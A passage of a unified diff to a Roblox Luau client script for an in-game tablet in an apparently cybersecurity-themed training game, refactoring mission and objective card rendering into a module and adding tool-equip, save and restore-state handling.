-			statusColor = Color3.fromRGB(255, 200, 0)
-		elseif taskInfo.status == "Locked" then
-			statusColor = Color3.fromRGB(140, 140, 140)
-		end
-
-		mk("TextLabel", {
-			Parent = taskRow,
-			BackgroundTransparency = 1,
-			Text = string.upper(taskInfo.status),
-			Font = Enum.Font.GothamBold,
-			TextSize = 12,
-			TextColor3 = statusColor,
-			Position = UDim2.new(0, 10, 0, 25),
-			Size = UDim2.new(1, -20, 0, 20),
-			TextXAlignment = Enum.TextXAlignment.Left,
-		})
-	end
-
-	task.defer(function()
-		local layout = MissionsList:FindFirstChild("UIListLayout")
-		if layout then
-			MissionsList.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
-		end
-	end)
+TabletMissionUI.renderMissionCards(MissionsList, objectivesList, mk, round)
 end
-
-local function getObjectiveStatusText(status)
-	if status == "Locked" then
-		return "Locked"
-	elseif status == "Completed" then
-		return "Completed"
-	elseif status == "In Progress" then
-		return "In Progress"
-	end
-	return "Unlocked"
-end
-
-local function getObjectiveStatusColor(status)
-	if status == "Locked" then
-		return Color3.fromRGB(140, 140, 140)
-	elseif status == "Completed" then
-		return Color3.fromRGB(0, 255, 100)
-	elseif status == "In Progress" then
-		return Color3.fromRGB(255, 200, 0)
-	end
-	return Color3.new(1, 1, 1)
-end
-
-local function buildFallbackChapterObjectives()
-	local chapters = {}
-	for _, scenarioId in ipairs({
-		"Chapter1_Recon",
-		"Chapter2_SSH",
-		"Chapter3_Malware",
-		"Chapter4_IncidentResponse",
-	}) do
-		local scenario = ScenarioData[scenarioId]
-		if scenario then
-			local unlocked = scenarioId == "Chapter1_Recon"
-			local chapterStatus = unlocked and "Unlocked" or "Locked"
-			local steps = {}
-			for _, step in ipairs(scenario.steps or {}) do
-				table.insert(steps, {
-					text = step.instruction or "Step",
-					status = unlocked and "Not Started" or "Locked",
-				})
-			end
-			table.insert(chapters, {
-				id = scenarioId,
-				title = scenario.title,
-				status = chapterStatus,
-				steps = steps,
-			})
-		end
-	end
-	return chapters
-end
-
-local function normalizeChapterObjectives(rawObjectives)
-	-- Only use objectives from the server; never fallback to static list
-	if type(rawObjectives) ~= "table" or #rawObjectives == 0 then
-		return {} -- Show nothing if no real data
-	end
-	local normalized = {}
-	for _, chapter in ipairs(rawObjectives) do
-		if type(chapter) == "table" and chapter.title then
-			table.insert(normalized, chapter)
-		end
-	end
-	return normalized
-end
-
 
 function renderObjectiveCards(objectivesList)
-    if not ObjectivesList then return end
-    -- print("Rendering objectives:", #objectivesList, "chapters")
-    objectivesList = normalizeChapterObjectives(objectivesList)
-
-	-- Clear previous objective cards
-	for _, child in ipairs(ObjectivesList:GetChildren()) do
-		if child:IsA("Frame") then
-			child:Destroy()
-		end
-	end
-
-	for _, chapter in ipairs(objectivesList) do
-		local card = mk("Frame", {
-			Parent = ObjectivesList,
-			BackgroundColor3 = Color3.fromRGB(20, 26, 38),
-			Size = UDim2.new(1, -10, 0, 0),
-			AutomaticSize = Enum.AutomaticSize.Y,
-		})
-		round(card, 10)
-
-		local header = mk("TextButton", {
-			Parent = card,
-			BackgroundTransparency = 1,
-			Size = UDim2.new(1, 0, 0, 44),
-			AutoButtonColor = false,
-			Text = "",
-		})
-
-		local titleLabel = mk("TextLabel", {
-			Parent = header,
-			BackgroundTransparency = 1,
-			Text = chapter.title,
-			Font = Enum.Font.GothamSemibold,
-			TextSize = 15,
-			TextColor3 = chapter.status == "Completed" and Color3.fromRGB(160,160,160) or Color3.new(1,1,1),
-			Position = UDim2.new(0, 10, 0, 8),
-			Size = UDim2.new(0.5, -10, 0, 28),
-			TextXAlignment = Enum.TextXAlignment.Left,
-		})
-		if chapter.status == "Completed" then
-			mk("Frame", {
-				Parent = titleLabel,
-				BackgroundColor3 = Color3.fromRGB(160, 160, 160),
-				BorderSizePixel = 0,
-				Size = UDim2.new(1, 0, 0, 2),
-				Position = UDim2.new(0, 0, 0.5, -1),
-			})
-		end
-
-		local startBtn = nil
-		if chapter.status == "Not Started" and chapter.unlocked then
-			startBtn = mk("TextButton", {
-				Parent = header,
-				Text = "Start",
-				Font = Enum.Font.GothamBold,
-				TextSize = 13,
-				TextColor3 = Color3.new(1,1,1),
-				BackgroundColor3 = Color3.fromRGB(79, 131, 255),
-				Size = UDim2.new(0, 60, 0, 28),
-				Position = UDim2.new(0.52, 0, 0, 8),
-			})
-			round(startBtn, 8)
-			startBtn.MouseButton1Click:Connect(function()
-				local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")
-				local loadScenario = remotes:FindFirstChild("LoadScenario")
-				if loadScenario then
-					loadScenario:InvokeServer(chapter.id)
-				end
-			end)
-		end
-
-		local statusLabel = mk("TextLabel", {
-			Parent = header,
-			BackgroundTransparency = 1,
-			Text = string.upper(getObjectiveStatusText(chapter.status)),
-			Font = Enum.Font.GothamBold,
-			TextSize = 13,
-			TextColor3 = getObjectiveStatusColor(chapter.status),
-			Position = UDim2.new(0.6, 0, 0, 8),
-			Size = UDim2.new(0.24, -10, 0, 28),
-			TextXAlignment = Enum.TextXAlignment.Right,
-		})
-
-		local statusIcon = mk("ImageLabel", {
-			Parent = header,
-			BackgroundTransparency = 1,
-			Image = chapter.status == "Locked" and "rbxassetid://18209587336" or "rbxassetid://18209574864",
-			Size = UDim2.new(0, 24, 0, 24),
-			Position = UDim2.new(0.86, 0, 0.5, -12),
-		})
-
-		local arrowLabel = mk("TextLabel", {
-			Parent = header,
-			BackgroundTransparency = 1,
-			Text = chapterExpanded[chapter.id] and "v" or ">",
-			Font = Enum.Font.GothamBold,
-			TextSize = 18,
-			TextColor3 = Color3.fromRGB(180, 180, 180),
-			Position = UDim2.new(0.94, 0, 0, 8),
-			Size = UDim2.new(0.06, -10, 0, 28),
-			TextXAlignment = Enum.TextXAlignment.Right,
-		})
-
-		local stepContainer
-		if chapterExpanded[chapter.id] and type(chapter.steps) == "table" and #chapter.steps > 0 then
-			stepContainer = mk("Frame", {
-				Parent = card,
-				BackgroundTransparency = 1,
-				Size = UDim2.new(1, 0, 0, 0),
-				AutomaticSize = Enum.AutomaticSize.Y,
-			})
-
-			mk("UIListLayout", {
-				Parent = stepContainer,
-				Padding = UDim.new(0, 6),
-				SortOrder = Enum.SortOrder.LayoutOrder,
-			})
-
-			for _, step in ipairs(chapter.steps) do
-				local stepRow = mk("Frame", {
-					Parent = stepContainer,
-					BackgroundColor3 = Color3.fromRGB(15, 19, 28),
-					Size = UDim2.new(1, -20, 0, 36),
-					Position = UDim2.new(0, 10, 0, 0),
-				})
-				round(stepRow, 8)
-
-				local stepTextColor = Color3.new(1, 1, 1)
-				if step.status == "Completed" then
-					stepTextColor = Color3.fromRGB(160, 160, 160)
-				end
-				local stepLabel = mk("TextLabel", {
-					Parent = stepRow,
-					BackgroundTransparency = 1,
-					Text = step.text,
-					Font = Enum.Font.Gotham,
-					TextSize = 14,
-					TextColor3 = stepTextColor,
-					Position = UDim2.new(0, 10, 0, 6),
-					Size = UDim2.new(0.7, -20, 1, -12),
-					TextXAlignment = Enum.TextXAlignment.Left,
-				})
-				if step.status == "Completed" then
-					mk("Frame", {
-						Parent = stepLabel,
-						BackgroundColor3 = Color3.fromRGB(160, 160, 160),
-						BorderSizePixel = 0,
-						Size = UDim2.new(1, 0, 0, 2),
-						Position = UDim2.new(0, 0, 0.5, -1),
-					})
-				end
-
-				mk("TextLabel", {
-					Parent = stepRow,
-					BackgroundTransparency = 1,
-					Text = string.upper(getObjectiveStatusText(step.status)),
-					Font = Enum.Font.GothamBold,
-					TextSize = 13,
-					TextColor3 = getObjectiveStatusColor(step.status),
-					Position = UDim2.new(0.7, 0, 0, 6),
-					Size = UDim2.new(0.3, -10, 1, -12),
-					TextXAlignment = Enum.TextXAlignment.Right,
-				})
-			end
-		end
-
-		header.MouseButton1Click:Connect(function()
-			if chapter.status == "Locked" then
-				return
-			end
-			chapterExpanded[chapter.id] = not chapterExpanded[chapter.id]
-			renderObjectiveCards(objectivesList)
-		end)
-	end
-
-	task.defer(function()
-		local layout = ObjectivesList:FindFirstChild("UIListLayout")
-		if layout then
-			ObjectivesList.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
-		end
-	end)
+TabletMissionUI.renderObjectiveCards(ObjectivesList, objectivesList, chapterExpanded, mk, round, function(chapter)
+local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")
+local loadScenario = remotes:FindFirstChild("LoadScenario")
+if loadScenario then
+loadScenario:InvokeServer(chapter.id)
+end
+end, function(chapter)
+chapterExpanded[chapter.id] = not chapterExpanded[chapter.id]
+renderObjectiveCards(objectivesList)
+end)
 end
 
-local clockLoopStarted = false
-local objectiveUpdatesBound = false
+do
+browserState._clockLoopStarted = false
+browserState._objectiveUpdatesBound = false
 
-local function updateClockLabel()
+browserState._updateClockLabel = function()
 	if ClockLabel and ClockLabel.Parent then
-		ClockLabel.Text = os.date("%H:%M:%S")
+		ClockLabel.Text = os.date("%H:%M")
 	end
 end
 
-local function refreshMissionPanels()
+browserState._refreshMissionPanels = function()
 	renderMissionCards(ObjectiveManager.Get())
 	renderObjectiveCards(ObjectiveManager.Get("ChapterObjectives"))
 end
 
-local function bindObjectiveUpdates()
-	if objectiveUpdatesBound then
+browserState._bindObjectiveUpdates = function()
+	if browserState._objectiveUpdatesBound then
 		return
 	end
 
-	objectiveUpdatesBound = true
+	browserState._objectiveUpdatesBound = true
 	ObjectiveManager.Changed:Connect(function(objectivesList, category)
 		if category == "ChapterObjectives" then
 			renderObjectiveCards(objectivesList)
@@ -2776,122 +2820,256 @@ local function bindObjectiveUpdates()
 	end)
 end
 
-local function ensureClockLoop()
-	updateClockLabel()
-	if clockLoopStarted then
+browserState._ensureClockLoop = function()
+	browserState._updateClockLabel()
+	if browserState._clockLoopStarted then
 		return
 	end
 
-	clockLoopStarted = true
+	browserState._clockLoopStarted = true
 	task.spawn(function()
 		while true do
 			task.wait(1)
-			updateClockLabel()
+			if not ClockLabel or not ClockLabel.Parent then
+				browserState._clockLoopStarted = false
+				break
+			end
+			browserState._updateClockLabel()
 		end
 	end)
 end
 
-local function onEquipped()
+browserState._onEquipped = function()
+	if not isToolEquipped() then
+		setEquipped(false)
+		lastEquipped = false
+		return
+	end
 	setEquipped(true)
+	lastEquipped = true
+	browserState._markInteraction()
+	local pendingRestore = Player:GetAttribute(RESTORE_STATE_ATTRIBUTE)
+	local hasPendingRestore = type(pendingRestore) == "string" and pendingRestore ~= ""
+	if HintGUI and HintGUI.Parent ~= PlayerGui then
+		HintGUI = nil
+	end
+	if MainGUI and MainGUI.Parent ~= PlayerGui then
+		MainGUI = nil
+	end
+	if ReplayPromptGUI and ReplayPromptGUI.Parent ~= PlayerGui then
+		ReplayPromptGUI = nil
+	end
+	local existingHint = PlayerGui:FindFirstChild("TabletHint")
+	if existingHint and existingHint ~= HintGUI then
+		existingHint:Destroy()
+	end
+	local existingMain = PlayerGui:FindFirstChild("TabletGUI")
+	if existingMain and existingMain ~= MainGUI then
+		existingMain:Destroy()
+	end
+	if ReplayPromptGUI then
+		ReplayPromptGUI.Enabled = false
+	end
+	local builtMain = false
+	if not HintGUI then
+		HintGUI = buildHint()
+	end
 	if not MainGUI then
 		MainGUI = buildMainUI()
+		builtMain = true
 	end
-	bindObjectiveUpdates()
-	ensureClockLoop()
-	refreshMissionPanels()
-	if not started then
-		if not HintGUI then
-			HintGUI = buildHint()
+	local restored = false
+	if hasPendingRestore then
+		restored = applyPendingRestoreState()
+	elseif builtMain and started then
+		restored = applySessionRestoreState(captureSessionRestoreState())
+	end
+	browserState._bindObjectiveUpdates()
+	browserState._ensureClockLoop()
+	browserState._refreshMissionPanels()
+	if started then
+		HintGUI.Enabled = false
+		MainGUI.Enabled = true
+		if builtMain or restored then
+			setVisiblePanel(browserState.visiblePanel, {
+				url = browserState.visiblePanel == "browser" and browserState.currentUrl or nil,
+				navigate = browserState.visiblePanel == "browser",
+				captureFocus = false,
+			})
 		end
+		playAudio()
+		if browserState._ensureChapter3MailVisible then
+			browserState._ensureChapter3MailVisible()
+		end
+	else
 		HintGUI.Enabled = true
 		MainGUI.Enabled = false
-	else
-		if HintGUI then HintGUI.Enabled = false end
-		MainGUI.Enabled = true
-		playAudio()
 	end
 	bindEGuard()
 end
-local function onUnequipped()
+
+browserState._onUnequipped = function()
+	if not isEquipped and not HintGUI and not MainGUI and not ReplayPromptGUI then
+		lastEquipped = false
+		return
+	end
 	setEquipped(false)
-	started = false
-	if HintGUI then HintGUI.Enabled = false end
-	if MainGUI then MainGUI.Enabled = false end
+	lastEquipped = false
+	if started then
+		saveNow({ force = true, silent = true })
+	end
+	local permanentRemoval = not Tool or Tool.Parent == nil
+	if ReplayPromptGUI then
+		ReplayPromptGUI.Enabled = false
+		if permanentRemoval then
+			ReplayPromptGUI:Destroy()
+			ReplayPromptGUI = nil
+		end
+	end
+	if HintGUI then 
+		HintGUI.Enabled = false
+		if permanentRemoval then
+			HintGUI:Destroy()
+			HintGUI = nil
+		end
+	end
+	if MainGUI then 
+		MainGUI.Enabled = false
+		if permanentRemoval then
+			MainGUI:Destroy()
+			MainGUI = nil
+		end
+	end
+	if permanentRemoval then
+		started = false
+	end
 	stopAudio()
 	teardownStart()
 	bindEGuard()
 end
-local function hookTool(t)
-if Tool == t then return end
-Tool = t
-t.AncestryChanged:Connect(function(_, parent)
-if not parent and Tool == t then
-onUnequipped()
-Tool = nil
+
+browserState._hookTool = function(t)
+	if Tool == t then return end
+	Tool = t
+	t.AncestryChanged:Connect(function(_, parent)
+		if not parent and Tool == t then
+			browserState._onUnequipped()
+			Tool = nil
+		end
+	end)
+	t:GetPropertyChangedSignal("Parent"):Connect(function()
+		if Tool ~= t then
+			return
+		end
+		local char = Player.Character
+		if char and t.Parent == char then
+			browserState._onEquipped()
+		elseif isEquipped or HintGUI or MainGUI or ReplayPromptGUI then
+			browserState._onUnequipped()
+		end
+	end)
+	t.Equipped:Connect(browserState._onEquipped)
+	t.Unequipped:Connect(browserState._onUnequipped)
+	local char = Player.Character
+	if char and t.Parent == char then
+		browserState._onEquipped()
+	end
 end
-end)
-t.Equipped:Connect(onEquipped)
-t.Unequipped:Connect(onUnequipped)
-local char = Player.Character
-if char and t.Parent == char then
-onEquipped()
+
+browserState._findTool = function()
+	local char = Player.Character
+	local backpack = Player:FindFirstChildOfClass("Backpack")
+	if char then
+		local t = char:FindFirstChild(TOOL_NAME)
+		if t and t:IsA("Tool") then return t end
+	end
+	if backpack then
+		local t = backpack:FindFirstChild(TOOL_NAME)
+		if t and t:IsA("Tool") then return t end
+	end
+	return nil
 end
+
+browserState._watchContainer = function(container)
+	if not container then
+		return
+	end
+	container.ChildAdded:Connect(function(child)
+		if child:IsA("Tool") and child.Name == TOOL_NAME then
+			browserState._hookTool(child)
+		end
+	end)
+	local toolInContainer = container:FindFirstChild(TOOL_NAME)
+	if toolInContainer and toolInContainer:IsA("Tool") then
+		browserState._hookTool(toolInContainer)
+	end
 end
-local function findTool()
-local char = Player.Character
-local backpack = Player:FindFirstChildOfClass("Backpack")
-if char then
-local t = char:FindFirstChild(TOOL_NAME)
-if t and t:IsA("Tool") then return t end
+
+browserState._watchContainer(Player:WaitForChild("Backpack"))
+browserState._watchContainer(Player.Character or Player.CharacterAdded:Wait())
+Tool = Tool or browserState._findTool()
+if Tool then
+	browserState._hookTool(Tool)
 end
-if backpack then
-local t = backpack:FindFirstChild(TOOL_NAME)
-if t and t:IsA("Tool") then return t end
-end
-return nil
-end
-local function scanForToolNow()
-local t = findTool()
-if t then hookTool(t) end
-end
-local function watch(container)
-if not container then return end
-container.ChildAdded:Connect(function(child)
-if child:IsA("Tool") and child.Name == TOOL_NAME then
-hookTool(child)
-end
-end)
-local existing = container:FindFirstChild(TOOL_NAME)
-if existing and existing:IsA("Tool") then
-hookTool(existing)
-end
-end
-watch(Player:WaitForChild("Backpack"))
-watch(Player.Character or Player.CharacterAdded:Wait())
-scanForToolNow()
+lastEquipped = isToolEquipped()
 Player.CharacterAdded:Connect(function(char)
-started = false
-stopAudio()
-teardownStart()
-bindEGuard()
-watch(char)
-task.defer(scanForToolNow)
+	started = false
+	stopAudio()
+	teardownStart()
+	bindEGuard()
+	browserState._watchContainer(char)
+	task.defer(function()
+		Tool = nil
+		lastEquipped = false
+		task.wait(0.1)
+		Tool = browserState._findTool()
+		if Tool then
+			browserState._hookTool(Tool)
+			if isToolEquipped() then
+				browserState._onEquipped()
+			end
+		end
+	end)
 end)
 RunService.Heartbeat:Connect(function()
-if not Tool then
-scanForToolNow()
-return
-end
-local equippedNow = isToolEquipped()
-if equippedNow ~= lastEquipped then
-lastEquipped = equippedNow
-if equippedNow then
-onEquipped()
-else
-onUnequipped()
-end
-end
+	local now = os.clock()
+	if not Tool then
+		Tool = browserState._findTool() or Tool
+		if Tool then
+			browserState._hookTool(Tool)
+		end
+		return
+	end
+	if browserState._ensureChapter3MailVisible then
+		browserState._ensureChapter3MailVisible()
+	end
+	if browserState.adminTab == "logs" and BrowserFrame and BrowserFrame.Visible and AdminDashboardPage and AdminDashboardPage.Visible then
+		if now - (browserState.logsLastRender or 0) >= 1 then
+			browserState.logsLastRender = now
+			renderAdminLogs()
+		end
+	end
+	if autoSaveQueuedAt > 0 and not autoSaveInFlight and now - autoSaveQueuedAt >= AUTO_SAVE_DELAY then
+		saveNow({ silent = true })
+	end
+	local equippedNow = isToolEquipped()
+	if equippedNow ~= lastEquipped then
+		lastEquipped = equippedNow
+		if equippedNow then
+			browserState._onEquipped()
+		else
+			browserState._onUnequipped()
+		end
+	end
 end)
+end
+
 if MainGUI then
 MainGUI:GetPropertyChangedSignal("Enabled"):Connect(bindEGuard)
 end
+Player:GetAttributeChangedSignal(RESTORE_STATE_ATTRIBUTE):Connect(function()
+applyPendingRestoreState()
+end)
+task.defer(function()
+applyPendingRestoreState()
+end)
